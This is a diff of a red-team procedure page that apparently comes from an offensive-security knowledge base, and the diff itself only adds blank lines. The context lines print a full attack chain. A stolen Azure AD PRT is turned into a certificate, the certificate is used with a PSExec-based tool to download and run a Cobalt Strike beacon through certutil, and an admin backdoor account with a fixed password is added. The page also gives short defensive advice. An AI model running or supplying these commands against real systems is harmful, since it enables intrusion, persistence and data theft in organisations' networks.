@@ -50,6 +50,8 @@ Technical Explanation: The attacker requests and saves an Azure AD certificate t
 
 Business Value: This technique can be used by an attacker to gain access to sensitive data, steal intellectual property, and disrupt business operations. By gaining access to a system remotely, the attacker can move laterally across the network, escalate privileges, and exfiltrate data. This can result in significant financial loss and reputational damage to the targeted organization.
 
+ 
+
 ## Requirements
 
 1. Access to the target system
@@ -58,7 +60,11 @@ Business Value: This technique can be used by an attacker to gain access to sens
 
 1. Remote command execution tool
 
+
+
 Requirements 2 can be obtained from the [Pass the PRT Procedure](https://app.redstack.io/content/procedure/62e04165-3022-4f6d-af61-e18953cbd62d)
+
+ 
 
 ## Defense
 
@@ -67,6 +73,8 @@ Requirements 2 can be obtained from the [Pass the PRT Procedure](https://app.red
 1. Monitor Azure AD certificate requests and revocations for suspicious activity
 
 1. Use network segmentation to limit lateral movement across the network
+
+ 
 
 ## Objectives
 
@@ -80,9 +88,15 @@ Requirements 2 can be obtained from the [Pass the PRT Procedure](https://app.red
 
 1. Exfiltrate data
 
+ 
+
 # Instructions
 
 1. To request and save an Azure AD certificate, use the PrtToCert tool. The Cert will expire in 14 days.
+
+
+
+
 
 **Command** ([[Azure Convert PRT to Certificate]]):
 
@@ -90,9 +104,15 @@ Requirements 2 can be obtained from the [Pass the PRT Procedure](https://app.red
 RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
 ```
 
+
+
 > Note: Make sure to replace the <TENANT-ID>, <PRT>, <Username>, <TENANT NAME>, <HEX-CONTEXT>, and <HEX-DERIVED-KEY> placeholders with the actual values.
 
 2. Use the Cert with PSExec to download and execute a C2 beacon using the AdureADJoinedMachinePTC (Main.py) tool:
+
+
+
+
 
 **Command** ([[Azure Cert with PSExec: certutil download and execute Cobalt Strike beacon]]):
 
@@ -100,13 +120,25 @@ RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT 
 AdureADJoinedMachinePTC.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --certpass AzureADCert --remoteip $TARGET_IP --command "certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe"
 ```
 
+
+
+
+
 3. (Optional) Use the Cert with PSExec to create a persistent user using the AdureADJoinedMachinePTC (Main.py) tool:
+
+
+
+
 
 **Command** ([[Use Azure Cert with PSExec remote add admin user]]):
 
 ```bash
 AdureADJoinedMachinePTC.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --certpass AzureADCert --remoteip $TARGET_IP --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
 ```
+
+
+
+
 
 > This tool allows for remote command execution on a victim machine. The user must provide a valid user certificate and password for authentication. Once authenticated, the tool will execute the specified command on the victim machine using PSEXEC and open a CMD shell for the user to interact with.
 
@@ -145,3 +177,5 @@ AdureADJoinedMachinePTC.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --
 - [[Cloud - Azure]]
 - [[Pass The Certificate]]
 - [[PSExec]]
+
+
